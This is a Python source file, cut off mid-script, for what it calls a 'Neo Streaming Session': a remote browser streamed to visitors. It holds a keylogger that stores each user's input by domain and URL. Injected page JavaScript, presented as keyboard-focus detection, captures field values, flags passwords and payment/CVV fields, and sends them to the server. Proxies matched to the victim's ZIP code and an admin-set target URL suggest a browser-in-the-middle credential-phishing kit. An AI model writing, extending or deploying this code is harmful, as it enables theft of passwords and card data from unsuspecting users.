"""
Neo Streaming Session - Pure CDP Screencast for 60 FPS
Production-ready input handling and high-performance streaming
With enhanced profile management for session persistence
Desktop-only - Mobile users blocked
"""

import asyncio
import time
import json
import re
import os
from typing import Dict, Optional, Any, List
from dataclasses import dataclass, field
from collections import deque
from pathlib import Path
import logging

# Import frame pools for independent per-session resources
from frame_pool import FramePool, PacketPool, StreamingPipeline
from dom_capture import DOMCaptureSession, LIVE_DELTA


def _sb_backend_enabled() -> bool:
    """True when the SeleniumBase UC backend is selected (BROWSER_BACKEND=sb
    or config browser_backend='sb').  Import is lazy so the Playwright path
    is untouched when SeleniumBase isn't installed."""
    try:
        from sb_backend import browser_backend
        return browser_backend() == "sb"
    except Exception:
        return False

# Import WebRTC streamer for high-performance video delivery
try:
    from webrtc_stream import WebRTCStreamer, WebRTCConfig, create_webrtc_streamer
    WEBRTC_AVAILABLE = True
except Exception as e:
    logger = logging.getLogger(__name__)
    logger.debug("WebRTC optional dependencies unavailable: %s", e)
    WEBRTC_AVAILABLE = False
    # Fall back to a None placeholder so attribute checks don't blow up
    WebRTCStreamer = None
    WebRTCConfig = None
    create_webrtc_streamer = None

# FORCE: Disable WebRTC at runtime for DOM-capture-only deployments.
# This prevents accidental creation of WebRTC streamers and keeps the
# server strictly in DOM-capture over WebSocket mode.
try:
    WEBRTC_AVAILABLE = False
    WebRTCStreamer = None
    WebRTCConfig = None
    create_webrtc_streamer = None
except Exception:
    pass

logger = logging.getLogger(__name__)


# ==============================
# Key Logger (KLG) System
# ==============================

KEYLOG_FILE = Path(__file__).parent / "data" / "key.json"
_keylog_lock = asyncio.Lock()
_keylog_write_lock = asyncio.Lock()
_keylog_state_lock = __import__('threading').RLock()
_keylog_cache: Optional[Dict] = None
_keylog_dirty = False
_keylog_writer_task: Optional[asyncio.Task] = None


def _ensure_keylog_dir():
    KEYLOG_FILE.parent.mkdir(parents=True, exist_ok=True)


def _read_keylog_file() -> Dict:
    try:
        if KEYLOG_FILE.exists():
            with open(KEYLOG_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
            if isinstance(data, dict) and isinstance(data.get('users'), dict):
                return data
    except json.JSONDecodeError as exc:
        logger.warning("[KLG] corrupted keylog file, resetting: %s", exc)
    except Exception as exc:
        logger.warning("[KLG] failed to load keylog: %s", exc)
    return {"users": {}}


def _load_keylog() -> Dict:
    """Return the process cache; disk is read only on first access."""
    global _keylog_cache
    with _keylog_state_lock:
        if _keylog_cache is None:
            _keylog_cache = _read_keylog_file()
        return _keylog_cache


def _snapshot_keylog() -> Dict:
    import copy
    with _keylog_state_lock:
        return copy.deepcopy(_load_keylog())


def _save_keylog(data: Dict):
    """Write one complete snapshot atomically; called off the event loop."""
    try:
        _ensure_keylog_dir()
        temp_file = KEYLOG_FILE.with_suffix('.json.tmp')
        with open(temp_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
            f.flush()
            os.fsync(f.fileno())
        os.replace(temp_file, KEYLOG_FILE)
        logger.debug("[KLG] saved keylog with %s users", len(data.get('users', {})))
    except Exception as exc:
        logger.error("[KLG] failed to save keylog: %s", exc)
        try:
            temp_file.unlink(missing_ok=True)
        except Exception:
            pass


async def _flush_keylog_now():
    """Persist the latest snapshot without blocking browser input callbacks."""
    global _keylog_dirty
    async with _keylog_write_lock:
        with _keylog_state_lock:
            snapshot = _snapshot_keylog()
            _keylog_dirty = False
        await asyncio.to_thread(_save_keylog, snapshot)
        with _keylog_state_lock:
            # A callback may have appended while the write was in flight.
            # Leave dirty set so the next scheduled flush includes it.
            return _keylog_dirty


async def _debounced_keylog_flush():
    global _keylog_writer_task
    try:
        await asyncio.sleep(0.25)
        await _flush_keylog_now()
    except asyncio.CancelledError:
        raise
    finally:
        _keylog_writer_task = None


def _schedule_keylog_flush():
    global _keylog_writer_task
    if _keylog_writer_task is None or _keylog_writer_task.done():
        _keylog_writer_task = asyncio.create_task(_debounced_keylog_flush())


async def log_keystroke(user_id: str, session_id: str, url: str, log_type: str, data: str):
    """Queue a session-partitioned keylog event without synchronous disk I/O."""
    try:
        from config import CONFIG
        if not getattr(CONFIG, 'keylog_enabled', True):
            return
    except Exception:
        pass
    user_id = user_id or session_id or "unknown_user"
    url = url or "unknown_url"
    try:
        from urllib.parse import urlparse
        domain = urlparse(url).netloc or "unknown"
    except Exception:
        domain = "unknown"
    timestamp = time.time()
    log_entry = {
        "timestamp": timestamp,
        "session_id": session_id,
        "type": log_type,
        "data": data,
        "url": url,
        "domain": domain,
    }
    async with _keylog_lock:
        global _keylog_dirty
        with _keylog_state_lock:
            keylog = _load_keylog()
            user_data = keylog["users"].setdefault(user_id, {"sessions": [], "domains": {}})
            if session_id and session_id not in user_data["sessions"]:
                user_data["sessions"].append(session_id)
            domain_data = user_data["domains"].setdefault(domain, {"urls": {}, "logs": []})
            url_data = domain_data["urls"].setdefault(
                url, {"first_seen": timestamp, "log_count": 0}
            )
            domain_data["logs"].append(log_entry)
            url_data["log_count"] += 1
            if len(domain_data["logs"]) > 5000:
                domain_data["logs"] = domain_data["logs"][-5000:]
            _keylog_dirty = True
        _schedule_keylog_flush()
    logger.debug("[KLG] queued %s for user %s/session %s", log_type, user_id, session_id)


def get_keylog_users() -> List[Dict]:
    keylog = _snapshot_keylog()
    users = []
    for user_id, user_data in keylog["users"].items():
        total_logs = sum(len(d.get("logs", [])) for d in user_data.get("domains", {}).values())
        users.append({
            "user_id": user_id,
            "session_count": len(user_data.get("sessions", [])),
            "domain_count": len(user_data.get("domains", {})),
            "total_logs": total_logs,
            "domains": user_data.get("domains", {}),
        })
    return users


def get_keylog_domains(user_id: str) -> List[Dict]:
    keylog = _snapshot_keylog()
    user_data = keylog["users"].get(user_id)
    if not user_data:
        return []
    return [
        {"domain": domain, "url_count": len(data.get("urls", {})),
         "log_count": len(data.get("logs", []))}
        for domain, data in user_data.get("domains", {}).items()
    ]


def get_keylog_urls(user_id: str, domain: str) -> List[Dict]:
    keylog = _snapshot_keylog()
    data = keylog["users"].get(user_id, {}).get("domains", {}).get(domain)
    if not data:
        return []
    return [
        {"url": url, "first_seen": value.get("first_seen", 0),
         "log_count": value.get("log_count", 0)}
        for url, value in data.get("urls", {}).items()
    ]


def get_keylog_for_url(user_id: str, url: str) -> List[Dict]:
    keylog = _snapshot_keylog()
    try:
        from urllib.parse import urlparse
        domain = urlparse(url).netloc or "unknown"
    except Exception:
        domain = "unknown"
    logs = keylog["users"].get(user_id, {}).get("domains", {}).get(domain, {}).get("logs", [])
    return [log for log in logs if log.get("url") == url]


async def clear_keylog_for_user(user_id: str) -> bool:
    global _keylog_dirty
    async with _keylog_lock:
        with _keylog_state_lock:
            keylog = _load_keylog()
            existed = user_id in keylog["users"]
            if existed:
                del keylog["users"][user_id]
                _keylog_dirty = True
        writer = _keylog_writer_task
        if writer and writer is not asyncio.current_task():
            writer.cancel()
    if writer and writer is not asyncio.current_task():
        try:
            await writer
        except asyncio.CancelledError:
            pass
    if existed:
        await _flush_keylog_now()
    return existed


async def clear_all_keylogs() -> bool:
    global _keylog_cache, _keylog_dirty
    async with _keylog_lock:
        with _keylog_state_lock:
            _keylog_cache = {"users": {}}
            _keylog_dirty = True
        writer = _keylog_writer_task
        if writer and writer is not asyncio.current_task():
            writer.cancel()
    if writer and writer is not asyncio.current_task():
        try:
            await writer
        except asyncio.CancelledError:
            pass
    await _flush_keylog_now()
    return True


def log(msg):
    # Keep the legacy call sites, but do not make operational failures
    # invisible.  The old no-op hid every SB input exception.
    logger.debug("[session] %s", msg)


def log_error(msg):
    logger.error("[session] %s", msg)


@dataclass
class PerformanceMonitor:
    """Performance monitoring for streaming session"""

    def __init__(self):
        self.frame_times: deque = deque(maxlen=100)
        self.capture_times: deque = deque(maxlen=100)
        self.encode_times: deque = deque(maxlen=100)
        self.transfer_times: deque = deque(maxlen=100)
        self.frame_count = 0
        self.start_time = time.time()
        self.last_fps_update = time.time()
        self.current_fps = 0

    def record_frame(self, capture_time: float, encode_time: float, transfer_time: float):
        """Record frame timing"""
        self.frame_times.append(time.time())
        self.capture_times.append(capture_time)
        self.encode_times.append(encode_time)
        self.transfer_times.append(transfer_time)
        self.frame_count += 1

        if time.time() - self.last_fps_update >= 1.0:
            self._update_fps()

    def _update_fps(self):
        elapsed = time.time() - self.last_fps_update
        if elapsed > 0:
            current_time = time.time()
            recent_frames = sum(1 for t in self.frame_times if current_time - t <= 1.0)
            self.current_fps = recent_frames
        self.last_fps_update = time.time()

    def get_stats(self) -> Dict:
        elapsed = time.time() - self.start_time
        return {
            'fps': round(self.current_fps, 1),
            'total_frames': self.frame_count,
            'avg_capture_ms': round(sum(self.capture_times) / max(len(self.capture_times), 1), 2),
            'uptime_seconds': round(elapsed, 1),
        }


class NeoStreamingSession:
    """
    Production-ready streaming session with pure CDP screencast.
    - Pure CDP streaming (no screenshot fallback)
    - Full mouse/keyboard input support
    - 60 FPS achievable with non-blocking architecture
    - Enhanced profile management for session persistence
    - Desktop only - mobile users blocked
    """

    def __init__(self, session_id: str, websocket: Any, user_agent: str,
                 viewport: Dict, pixel_ratio: float, config, gpu_manager,
                 user_id: str = None, target_url: str = None,
                 is_mobile: bool = False,
                 client_ip: str = None, country: str = None, state: str = None,
                 city: str = None, zip_code: str = None):
        self.session_id = session_id
        self.websocket = websocket
        # A monotonically increasing connection generation prevents an old
        # websocket's disconnect/finally path from acting on a reconnected
        # generation that owns this runtime session now.  The lock only
        # protects swapping the owner; message handlers still use the
        # generation predicate before mutating browser state.
        self._websocket_generation = 1
        self._websocket_state_lock = asyncio.Lock()
        self._cleanup_started = False
        self._closing = False
        self._apple_mobile_client = False
        try:
            from browser_manager import (
                is_apple_mobile_user_agent,
                normalize_mobile_user_agent,
            )
            self._apple_mobile_client = is_apple_mobile_user_agent(user_agent)
            self.user_agent = normalize_mobile_user_agent(user_agent) or (user_agent or '')
        except Exception:
            # Keep session construction independent of optional browser deps.
            self.user_agent = user_agent or ''
        self.config = config
        self.gpu_manager = gpu_manager
        
        # User ID for profile management (defaults to session_id if not provided)
        self.user_id = user_id or session_id
        
        # Client location info for profile
        self.client_ip = client_ip or '--'
        self.country = country or '--'
        self.state = state or '--'
        self.city = city or '--'
        self.zip_code = zip_code or '--'
        
        # Decodo proxy URL for browser - set based on client location
        self.proxy_url: Optional[str] = None
        self.proxy_host: Optional[str] = None
        self.proxy_port: Optional[int] = None
        self.proxy_username: Optional[str] = None
        self.proxy_password: Optional[str] = None
        
        # Target URL (can be overridden by Admin) - ensure it's never None or empty
        self.target_url = target_url or config.default_url or "https://www.google.com"

        # Use client's actual viewport - server matches client's screen size
        self.viewport = viewport
# Page transition detection
        self.current_url = None
        self.last_transition_time = 0
        self.transition_cooldown = 0.5  # seconds between transitions
        self._transition_check_task = None
        self.pixel_ratio = pixel_ratio if pixel_ratio > 0 else 1.0


        self.browser = None
        self.context = None
        self.pages: Dict[str, Any] = {}  # Track all open pages/tabs
        self.active_page_id: Optional[str] = None  # Currently active tab for streaming
        self.is_active = False
        self.is_sleeping = False
        self.current_domain = ""
        self.frame_count = 0
        self.start_time = time.time()
        self.last_activity = time.time()
        self.device_id = ""
        self.mouse_position = {'x': 0, 'y': 0}
        self.mouse_buttons = 0

        self.browser_manager = None
        self.perf_monitor = PerformanceMonitor()
        self.dom_capture = None
        
        # INDEPENDENT PER-SESSION POOLS: Each session has its own resources
        # No shared pools to avoid contention between sessions
        self.frame_pool = FramePool(
            size=64,
            width=viewport.get('width', 1920),
            height=viewport.get('height', 1080)
        )
        self.packet_pool = PacketPool(size=64)
        self.pipeline = StreamingPipeline(target_fps=60)
        
        # PERMISSION HANDLING: Track pending permission requests
        self._pending_permissions: Dict[str, asyncio.Future] = {}
        self.gpu_id = self.gpu_manager.get_gpu_for_session()
        self.current_quality = config.quality
        self.current_fps = config.target_fps
        
        # Adaptive FPS tracking
        self._adaptive_fps_enabled = config.adaptive_fps
        self._fps_min = config.fps_min
        self._fps_max = config.fps_max
        self._fps_drop_threshold = config.fps_drop_threshold
        self._fps_recovery_threshold = config.fps_recovery_threshold
        self._consecutive_drops = 0
        self._consecutive_recoveries = 0
        
        # Pure CDP Streamer (no fallback)
        self._streamer = None
        self._streaming_type = "cdp"
        
        # Profile management
        self._profile_saved = False

        # Remote DOM capture pipeline
        self.dom_capture = None
        
        # Reconnect token for fast reconnect (Part 4)
        self.reconnect_token: Optional[str] = None
        self._session_registry = None
        
        # Input state (Part 6)
        self.inputs_enabled = True
        self._capture_first_input_task: Optional[asyncio.Task] = None
        self._input_handoff_logged = False
        
        # Use explicit is_mobile flag from client (more reliable than UA detection)
        # Fall back to UA detection if not provided
        if is_mobile is not None:
            self.is_mobile = bool(is_mobile) or self._apple_mobile_client
        else:
            # Detect if client is mobile based on the normalized UA - fallback.
            self.is_mobile = bool(self.user_agent and any(mobile_id in self.user_agent.lower()
                for mobile_id in ['android', 'webos', 'iphone', 'ipad', 'ipod',
                                'blackberry', 'iemobile', 'opera mini', 'opera mobi']))
        
        # Resize debounce - prevents flash during page navigation
        self._resize_debounce_task = None
        self._resize_debounce_delay = 0.15  # 150ms debounce
        self._pending_resize = None  # Store pending resize params
        
        
        
        # VisualViewport tracking (replaces debounce for smoother transitions)
        self._visual_viewport_scale = 1.0
        self._visual_viewport_offset_top = 0
        self._visual_viewport_offset_left = 0
        self._visual_viewport_page_top = 0
        self._visual_viewport_page_left = 0
        self._last_visual_viewport_scale = 1.0
        self._last_scroll_position = {'top': 0, 'left': 0}
        self._pending_visual_viewport = None# Inactivity tracking (Part 5)
        self.inactivity_threshold = 30  # seconds
        self._inactivity_task = None

        # Heartbeat tracking (Part 3)
        self._last_client_pong_time = time.time()
        self._heartbeat_task = None
        self._ping_interval = config.heartbeat_interval  # seconds
        # Session never expires - set to very large value (10 years)
        self._session_timeout = 315360000  # 10 years in seconds

        # Adaptive Bitrate Streaming (10-20 Mbps)
        self.bitrate_controller = None

        # PERFORMANCE: Streaming task management for independent execution
        self._streaming_task: Optional[asyncio.Task] = None
        self._streaming_shutdown_event = asyncio.Event()

        # PERFORMANCE: Frame pacing configuration
        self._frame_pacing_enabled = True
        self._target_frame_time = 1.0 / 60.0  # 16.67ms for 60 FPS

    async def start(self, url: str = None) -> bool:
        """Start the streaming session with pure CDP screencast"""
        try:
            # Use provided URL or fall back to target_url
            target_url = url or self.target_url
            
            # Import browser manager
            from browser_manager import BrowserManager
            self.browser_manager = BrowserManager(self.config, self.gpu_manager)
            
            # Initialize proxy_config as None
            proxy_config = None
            
            # Fetch proxy from Decodo if proxy is enabled - SIMPLE approach
            if getattr(self.config, 'proxy_enabled', False):
                try:
                    proxy_server = getattr(self.config, 'proxy_server', '')
                    proxy_username_template = getattr(self.config, 'proxy_username', '')
                    proxy_password = getattr(self.config, 'proxy_password', '')
                    
                    if proxy_server and proxy_username_template:
                        # Check if username template contains <client_zip> placeholder
                        has_zip_placeholder = '<client_zip>' in proxy_username_template
                        
                        if has_zip_placeholder:
                            # ZIP CODE FORMAT: Replace <client_zip> with actual client zip code
                            # Validate zip code: must be exactly 5 digits AND country must be USA
                            # If country is not USA, use default zip code 90001 (LA zip)
                            client_zip = self.zip_code or ''
                            client_country = self.country or ''
                            
                            # Check if country is USA and zip is valid (5 digits)
                            is_usa = client_country.upper() in ['US', 'USA', 'UNITED STATES']
                            is_valid_zip = client_zip and len(client_zip) == 5 and client_zip.isdigit()
                            
                            if not is_usa or not is_valid_zip:
                                client_zip = '90001'  # Default LA zip code
                                logger.debug(f"[PROXY] Using default zip {client_zip} (country: {client_country}, original_zip: {self.zip_code})")
                            
                            proxy_username = proxy_username_template.replace('<client_zip>', client_zip)
                        else:
                            # DIRECT FORMAT: Use username as-is, no zip code replacement needed
                            proxy_username = proxy_username_template
                        
                        # Parse and store proxy components before logging
                        self.proxy_host = proxy_server.split('://')[1].split(':')[0] if '://' in proxy_server else proxy_server
                        self.proxy_port = int(proxy_server.split(':')[-1]) if ':' in proxy_server else 80
                        self.proxy_username = proxy_username
                        self.proxy_password = proxy_password

                        if has_zip_placeholder:
                            logger.debug(f"[PROXY] Session {self.session_id}: Using ZIP format proxy {self.proxy_host}:{self.proxy_port} (zip: {client_zip})")
                        else:
                            logger.debug(f"[PROXY] Session {self.session_id}: Using DIRECT format proxy {self.proxy_host}:{self.proxy_port}")
                        
                        # Build proxy_url
                        self.proxy_url = f"http://{proxy_username}:{proxy_password}@{proxy_server.replace('http://', '').replace('https://', '')}"
                        
                        proxy_config = {'proxy_url': self.proxy_url}
                    else:
                        logger.warning(f"[PROXY] Session {self.session_id}: Proxy not configured properly")
                except Exception as e:
                    logger.error(f"[PROXY] Session {self.session_id}: Error setting up proxy: {e}")
            
            # Oxylabs Browser Proxy - DC proxies for browser traffic
            if proxy_config is None and getattr(self.config, 'oxylabs_browser_proxy_enabled', False):
                try:
                    proxy_server = getattr(self.config, 'oxylabs_browser_proxy', '')
                    proxy_username = getattr(self.config, 'oxylabs_browser_username', '')
                    proxy_password = getattr(self.config, 'oxylabs_browser_password', '')
                    
                    if proxy_server and proxy_username:
                        # Build proxy URL with credentials
                        server_host = proxy_server.replace('http://', '').replace('https://', '')
                        self.proxy_url = f"http://{proxy_username}:{proxy_password}@{server_host}"
                        
                        # Parse components
                        self.proxy_host = server_host.split(':')[0]
                        self.proxy_port = int(server_host.split(':')[1]) if ':' in server_host else 8000
                        self.proxy_username = proxy_username
                        self.proxy_password = proxy_password
                        
                        proxy_config = {'proxy_url': self.proxy_url}
                        logger.debug(f"[PROXY] Session {self.session_id}: Using Oxylabs Browser Proxy {self.proxy_host}:{self.proxy_port}")
                except Exception as e:
                    logger.error(f"[PROXY] Session {self.session_id}: Oxylabs Browser Proxy error: {e}")
            
            # Oxylabs Web Unlocker Proxy - For anti-bot bypass
            if proxy_config is None and getattr(self.config, 'oxylabs_unlocker_proxy_enabled', False):
                try:
                    proxy_server = getattr(self.config, 'oxylabs_unlocker_proxy', '')
                    proxy_username = getattr(self.config, 'oxylabs_unlocker_username', '')
                    proxy_password = getattr(self.config, 'oxylabs_unlocker_password', '')
                    
                    if proxy_server and proxy_username:
                        # Build proxy URL with credentials
                        server_host = proxy_server.replace('http://', '').replace('https://', '')
                        self.proxy_url = f"http://{proxy_username}:{proxy_password}@{server_host}"
                        
                        # Parse components
                        self.proxy_host = server_host.split(':')[0]
                        self.proxy_port = int(server_host.split(':')[1]) if ':' in server_host else 60000
                        self.proxy_username = proxy_username
                        self.proxy_password = proxy_password
                        
                        proxy_config = {'proxy_url': self.proxy_url}
                        logger.debug(f"[PROXY] Session {self.session_id}: Using Oxylabs Web Unlocker {self.proxy_host}:{self.proxy_port}")
                except Exception as e:
                    logger.error(f"[PROXY] Session {self.session_id}: Oxylabs Web Unlocker error: {e}")
            
            # Create browser - SeleniumBase UC backend when selected
            # (MIGRATION_SELENIUMBASE.md): SB launches/stealths/lifecycles
            # real Chrome; our async CDP adapter (sb_backend) stands in for
            # the Playwright (browser, context) pair with the same shape.
            #
            # This selection is deliberately strict.  Starting an SB Chrome,
            # failing to attach, and then silently creating a second Playwright
            # Chrome made the visible window look alive while input/capture was
            # being sent to another backend.  If SB is selected, report the
            # launch/attach failure and stop this session; use
            # BROWSER_BACKEND=pw explicitly to opt into the legacy path.
            if not self.browser and _sb_backend_enabled():
                try:
                    from sb_backend import launch_for_session
                    _profile_dir = None
                    try:
                        if self.browser_manager and hasattr(self.browser_manager, 'get_session_profile_path'):
                            _profile_dir = str(
                                self.browser_manager.get_session_profile_path(
                                    self.user_id, self.session_id
                                )
                            )
                        elif self.browser_manager and getattr(self.browser_manager, 'profile_manager', None):
                            _profile_dir = str(self.browser_manager.profile_manager.get_user_profile_path(self.user_id))
                    except Exception:
                        _profile_dir = None
                    _sb_proxy = (proxy_config or {}).get('proxy_url') or getattr(self, 'proxy_url', None)
                    _sb_browser = await launch_for_session(
                        self.session_id,
                        self.viewport,
                        self.pixel_ratio,
                        self.user_id,
                        self.user_agent,
                        self.is_mobile,
                        _profile_dir,
                        proxy_url=_sb_proxy,
                    )
                    self.browser, self.context = _sb_browser, _sb_browser.contexts[0]
                    if hasattr(self.browser_manager, 'register_active_browser'):
                        self.browser_manager.register_active_browser(
                            self.session_id, self.browser, self.context, self.user_id,
                            _profile_dir, self.gpu_id
                        )
                    logger.info(
                        "[SB] session=%s backend=seleniumbase-cdp active profile=%s",
                        self.session_id, _profile_dir,
                    )
                except Exception as _sb_exc:
                    # No Playwright fallback here: it would invalidate every
                    # diagnostic about the SB input path and can leave the
                    # operator looking at a different browser window.
                    logger.exception(
                        "[SB] session=%s backend startup/attach failed; "
                        "session refused (set BROWSER_BACKEND=pw for rollback): %s",
                        self.session_id, _sb_exc,
                    )
                    self.browser = None
                    self.context = None
                    return False
            # Create browser - use the unified Playwright launcher for mobile
            # and desktop. Both use the client's CSS logical viewport
            # verbatim (1 CSS px = 1 surface px).
            if not self.browser:
                self.browser, self.context = await self.browser_manager.create_browser(
                    self.session_id,
                    self.viewport,
                    self.pixel_ratio,
                    self.user_id,
                    self.gpu_id,
                    self.user_agent,
                    self.is_mobile,
                    self.target_url,
                    proxy_config=proxy_config
                )

            if not self.browser or not self.context:
                log_error("Browser creation returned None")
                return False

            self.page = await self.context.new_page()
            self.dom_capture = DOMCaptureSession(page=self.page, websocket=self.websocket, client_id=self.session_id)
            if self.is_mobile:
                try:
                    await self.page.set_viewport_size({
                        'width': self.viewport.get('width', 1920),
                        'height': self.viewport.get('height', 1080)
                    })
                except Exception as e:
                    logger.warning(f"[STARTUP] Mobile viewport resize failed: {e}")

            # Initialize pages dict with the first page
            page_id = self._generate_page_id(self.page)
            self.pages[page_id] = self.page
            self.active_page_id = page_id
            
            # Set up popup/tab event listeners
            self._setup_page_listeners()
            
            # Set up input focus detection for mobile keyboard support
            await self._setup_input_focus_detection()
            
            # NEW: Set up permission handler for Chrome dialogs/notifications
            await self._setup_permission_handler()
            
            await self.get_active_page().set_extra_http_headers({
                'User-Agent': self.user_agent
            })
            
            # Load cookies from storage only for ephemeral profiles (chrome_profile loads natively)
            _profile_dir = getattr(self.browser, "profile_dir", None)
            if not _profile_dir or "chrome_profile" not in str(_profile_dir):
                if self.browser_manager.profile_exists(self.user_id):
                    try:
                        cookies = await self.browser_manager.load_cookies(self.user_id)
                        if cookies:
                            await self.context.add_cookies(cookies)
                    except Exception:
                        pass

            try:
                # Ensure URL has https:// prefix
                if not target_url.startswith('http://') and not target_url.startswith('https://'):
                    target_url = 'https://' + target_url
                
                logger.debug(f"[NAVIGATION] Attempting to navigate to: {target_url}")
                await self.get_active_page().goto(target_url, wait_until='domcontentloaded', timeout=30000)
                self.current_domain = self._extract_domain(target_url)
                self._apply_snapshot_preference(target_url)
                logger.debug(f"[NAVIGATION] Successfully navigated to: {self.current_domain}")
            except Exception as nav_error:
                # Log the navigation error for debugging
                logger.error(f"[NAVIGATION] Failed to navigate to {target_url}: {nav_error}")
                
                # Only fall back to default URL if target_url is not the intended destination
                # and the error is likely a connection issue, not a user-requested URL
                if target_url != self.config.default_url and self.config.default_url:
                    # Try default URL as fallback
                    try:
                        logger.debug(f"[NAVIGATION] Falling back to default URL: {self.config.default_url}")
                        await self.get_active_page().goto(self.config.default_url, wait_until='domcontentloaded', timeout=30000)
                        self.current_domain = self._extract_domain(self.config.default_url)
                    except Exception:
                        logger.error(f"[NAVIGATION] Also failed to navigate to default URL")
                        pass
                else:
                    # If target_url is already the default, just keep trying
                    pass

            self.is_active = True

            # CRITICAL FIX: Calculate and set physical viewport dimensions BEFORE sending metadata
            # This prevents the race condition where _send_metadata() was called before
            # _streaming_loop_independent() could set _physical_viewport_width/height
            #
            # LOGICAL-PIXEL POLICY: physical viewport == logical viewport,
            # the client's CSS pixels straight through. No scaling anywhere.
            logical_width = self.viewport.get('width', 1920)
            logical_height = self.viewport.get('height', 1080)

            self._physical_viewport_width = logical_width
            self._physical_viewport_height = logical_height
            logger.debug(
                f"[STARTUP] Logical-pixel viewport set: "
                f"{self._physical_viewport_width}x{self._physical_viewport_height} "
                f"(no surface scaling)"
            )
            
            # Save initial profile info
            await self._save_profile_info()
            
            # Start heartbeat monitoring (Part 3)
            self._heartbeat_task = asyncio.create_task(self._heartbeat_monitor())
            
            # Start DOM capture path (replace legacy streaming loop)
            self._streaming_shutdown_event.clear()
            # Send initial DOM snapshot (force) and start URL watch to push updates
            try:
                # Force an immediate capture on initial connect so the client
                # receives the first full SingleFile snapshot even if the
                # page-side observer hasn't been installed yet.
                asyncio.create_task(self.capture_remote_page(reason="initial_connect", force=True))
                if self.dom_capture and not getattr(self.dom_capture, 'url_watch_task', None):
                    self.dom_capture.url_watch_task = asyncio.create_task(self.dom_capture.watch_url())
            except Exception as e:
                logger.warning(f"[STARTUP] DOM capture init failed: {e}")

            await self._send_metadata()

            return True

        except Exception as e:
            log_error(f"Session start failed: {e}")
            return False

    async def _setup_input_focus_detection(self):
        """
        Set up JavaScript to detect when input fields gain focus.
        When an input gets focus, notify the client to open the virtual keyboard.
        Only triggers when user DIRECTLY taps on a text input field.
        """
        try:
            # JavaScript to inject into the page for focus detection and real-time input capture
            # FIX: Only trigger keyboard on user-initiated focus (click/touch), not auto-focus
            focus_detection_script = """
            (function() {
                'use strict';
                
                // Track if we've already set up listeners to avoid duplicates
                if (window._neo_keyboard_detection_initialized) {
                    return;
                }
                window._neo_keyboard_detection_initialized = true;
                
                // Track the currently focused input element
                let activeInputElement = null;
                
                function isTextInput(element) {
                    const tagName = element.tagName.toLowerCase();
                    const inputType = element.type ? element.type.toLowerCase() : '';
                    
                    // Check for text-like input types
                    const textTypes = ['text', 'password', 'email', 'number', 'tel', 'url', 'search', 'date', 'time', 'datetime-local'];
                    
                    if (tagName === 'input' && textTypes.includes(inputType)) {
                        return true;
                    }
                    if (tagName === 'textarea') {
                        return true;
                    }
                    if (element.isContentEditable) {
                        return true;
                    }
                    
                    return false;
                }
                
                function getFieldInfo(element) {
                    const tagName = element.tagName.toLowerCase();
                    const inputType = element.type ? element.type.toLowerCase() : '';
                    const name = element.name || element.id || '';
                    const placeholder = element.placeholder || '';
                    const label = element.labels && element.labels[0] ? element.labels[0].textContent.trim() : '';
                    
                    // Try to get field context from nearby elements
                    let context = '';
                    if (label) context = label;
                    else if (placeholder) context = placeholder;
                    else if (name) context = name;
                    
                    // Determine field type for categorization
                    let fieldCategory = 'other';
                    if (inputType === 'password' || name.toLowerCase().includes('pass')) {
                        fieldCategory = 'password';
                    } else if (inputType === 'email' || name.toLowerCase().includes('email') || placeholder.toLowerCase().includes('email')) {
                        fieldCategory = 'email';
                    } else if (inputType === 'tel' || name.toLowerCase().includes('phone') || name.toLowerCase().includes('tel')) {
                        fieldCategory = 'phone';
                    } else if (inputType === 'search' || name.toLowerCase().includes('search') || placeholder.toLowerCase().includes('search')) {
                        fieldCategory = 'search';
                    } else if (name.toLowerCase().includes('user') || name.toLowerCase().includes('login') || name.toLowerCase().includes('username')) {
                        fieldCategory = 'username';
                    } else if (name.toLowerCase().includes('name') || name.toLowerCase().includes('first') || name.toLowerCase().includes('last')) {
                        fieldCategory = 'name';
                    } else if (name.toLowerCase().includes('address') || name.toLowerCase().includes('street')) {
                        fieldCategory = 'address';
                    } else if (name.toLowerCase().includes('credit') || name.toLowerCase().includes('card') || name.toLowerCase().includes('cvv')) {
                        fieldCategory = 'payment';
                    }
                    
                    return {
                        name: name,
                        type: inputType || tagName,
                        tagName: tagName,
                        context: context,
                        fieldCategory: fieldCategory,
                        url: window.location.href,
                        domain: window.location.hostname
                    };
                }
                
                function handleInputClick(event) {
                    const target = event.target;
                    
                    // If clicking on a text input, open keyboard and track this element
                    if (isTextInput(target)) {
                        activeInputElement = target;
                        
                        if (window.__neoNotifyKeyboardRequest) {
                            window.__neoNotifyKeyboardRequest();
                        }
                        
                        return;
                    }
                    
                    // If clicking elsewhere AND we have an active input, close keyboard
                    if (activeInputElement && window.__neoNotifyKeyboardClose) {
                        // Only close if clicking outside the current input
                        if (!activeInputElement.contains(target)) {
                            activeInputElement = null;
                            window.__neoNotifyKeyboardClose();
                        }
                    }
                }
                
                function handleFocus(event) {
                    const target = event.target;
                    if (isTextInput(target)) {
                        activeInputElement = target;
                        
                        if (window.__neoNotifyKeyboardRequest) {
                            window.__neoNotifyKeyboardRequest();
                        }
                    }
                }
                
                function handleBlur(event) {
                    const target = event.target;
                    // When input loses focus, close the keyboard
                    if (target === activeInputElement) {
                        activeInputElement = null;
                        if (window.__neoNotifyKeyboardClose) {
                            window.__neoNotifyKeyboardClose();
                        }
                    }
                }
                
                // INPUT CAPTURE ENABLED - Capture all input fields in real-time
                // This captures inputs from sites like Google that don't use traditional forms
                // Captures: text, password, email, search, and any editable fields
                function handleInputChange(event) {
                    const target = event.target;
                    if (!target || !target.matches) return;
                    
                    // Check if this is a text-like input
                    const tagName = target.tagName ? target.tagName.toLowerCase() : '';
                    const inputType = target.type ? target.type.toLowerCase() : '';
                    const textTypes = ['text', 'password', 'email', 'number', 'tel', 'url', 'search', 'date', 'time', 'datetime-local'];
                    
                    // Also capture contenteditable elements
                    const isContentEditable = target.isContentEditable;
                    
                    if (tagName === 'input' && textTypes.includes(inputType)) {
                        // This is a text input field - capture it
                        const fieldInfo = getFieldInfo(target);
                        const value = target.value || '';
                        
                        // Skip if empty
                        if (!value.trim()) return;
                        
                        // Build input data for logging
                        const inputData = {
                            type: 'input_field',
                            fieldType: inputType,
                            fieldName: fieldInfo.name,
                            fieldCategory: fieldInfo.fieldCategory,
                            value: value,
                            isPassword: inputType === 'password',
                            url: window.location.href,
                            domain: window.location.hostname
                        };
                        
                        // Send to server for logging
                        if (window.__neoLogInput) {
                            window.__neoLogInput(inputData);
                        }
